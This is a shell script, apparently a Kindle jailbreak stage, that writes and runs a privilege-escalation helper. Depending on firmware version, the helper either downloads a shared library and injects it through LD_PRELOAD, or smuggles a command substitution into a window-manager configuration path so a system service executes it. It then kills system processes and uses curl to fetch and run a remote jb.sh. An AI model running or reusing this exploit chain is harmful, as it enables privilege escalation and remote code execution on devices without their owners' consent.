#!/bin/sh
export PATH=/sbin:/usr/sbin:/bin:/usr/bin
if [ "$(id -u)" -ne 0 ]; then
  [ -d /tmp/.vera_p.lock ] && exit 0
  mkdir /tmp/.vera_stage1.lock 2>/dev/null || exit 0
fi

cat > "/tmp/privesc.sh" <<- 'EOF'
#!/bin/sh
  export PATH=/sbin:/usr/sbin:/bin:/usr/bin
  if cat /etc/prettyversion.txt | grep -q "5.1"; then # first, check if we are <5.20
      logger "privesc.sh: <5.20 detected, using old privesc method"
      curl -o /tmp/jb.so https://kindlemodding.org/vera/aprivesc/jb.so
      chmod +x /tmp/jb.so
      lipc-set-prop com.lab126.system updateWaveform LD_PRELOAD=/tmp/jb.so
    else # >=5.20, so new privesc method
      if [ "$(id -u)" -ne 0 ]; then
        [ -d /tmp/.vera_p.lock ] && exit 0
        [ -d /tmp/.vera_stage1.lock ] || mkdir /tmp/.vera_stage1.lock 2>/dev/null || exit 0
        mkdir /tmp/.vera_p.stage1.lock 2>/dev/null || exit 0
        chmod 755 /tmp/privesc.sh 2>/dev/null || true
        logger "privesc.sh: 5.20 detected, running privesc"
        (
          sleep 3
          if [ ! -d /tmp/.vera_p.lock ]; then
            rmdir /tmp/.vera_stage1.lock /tmp/.vera_p.stage1.lock 2>/dev/null || true
            killall -9 webreader 2>/dev/null || true
          fi
        ) </dev/null >/dev/null 2>&1 &
        set-dynconf-value winmgr.vibrancyMode.pref.path "\$(/bin/sh /tmp/privesc.sh) #"
        lipc-set-prop -s com.lab126.winmgr vibrancyMode "lol"
        exit 0
      fi
      mkdir /tmp/.vera_p.lock 2>/dev/null || exit 0
      killall -9 webreader system_crash_handler core_stackwalk dmcc.sh >/dev/null 2>&1 || true
      set-dynconf-value winmgr.vibrancyMode.pref.path "" >/dev/null 2>&1 || true
      rm -f /var/local/system/dynconfig/winmgr.vibrancyMode.pref.path >/dev/null 2>&1 || true
      (
        for _fd in /proc/$$/fd/*; do
          _fd_num="${_fd##*/}"
          if [ "$_fd_num" -gt 2 ] 2>/dev/null; then
            eval "exec ${_fd_num}>&-" 2>/dev/null || true
          fi
        done
        _jb_ok=0
        cleanup_lock() {
          killall -9 system_crash_handler core_stackwalk dmcc.sh 2>/dev/null || true
          rm -rf /tmp/dmcc.* /var/tmp/dmcc.* 2>/dev/null || true
          if [ "$_jb_ok" -eq 0 ]; then
            initctl start webreader >/dev/null 2>&1 || true
            rmdir /tmp/.vera_stage1.lock /tmp/.vera_p.stage1.lock /tmp/.vera_p.lock 2>/dev/null || true
          fi
        }
        trap 'cleanup_lock' EXIT INT TERM
        initctl stop webreader >/dev/null 2>&1 || true
        lipc-set-prop -s com.lab126.appmgrd stop com.lab126.booklet.reader >/dev/null 2>&1 || true
        lipc-set-prop -i com.lab126.appmgrd close 1 >/dev/null 2>&1 || true
        lipc-set-prop -s com.lab126.appmgrd backward 1 >/dev/null 2>&1 || true
        killall -9 webreader system_crash_handler core_stackwalk dmcc.sh >/dev/null 2>&1 || true
        rm -rf /tmp/dmcc.* /var/tmp/dmcc.* 2>/dev/null || true
        rm -f /tmp/jb.sh 2>/dev/null || true
        if curl -fL https://kindlemodding.org/jb.sh -o /tmp/jb.sh && [ -s /tmp/jb.sh ] && /bin/sh -n /tmp/jb.sh; then
          if RUN_MODE=1 /bin/sh /tmp/jb.sh; then
            _jb_ok=1
          fi
        fi
      ) < /dev/null > /dev/null 2>&1 &
      exit 0
  fi
EOF

chmod 755 /tmp/privesc.sh 2>/dev/null || true
logger "heredoc created, running privesc.sh"
/bin/sh /tmp/privesc.sh
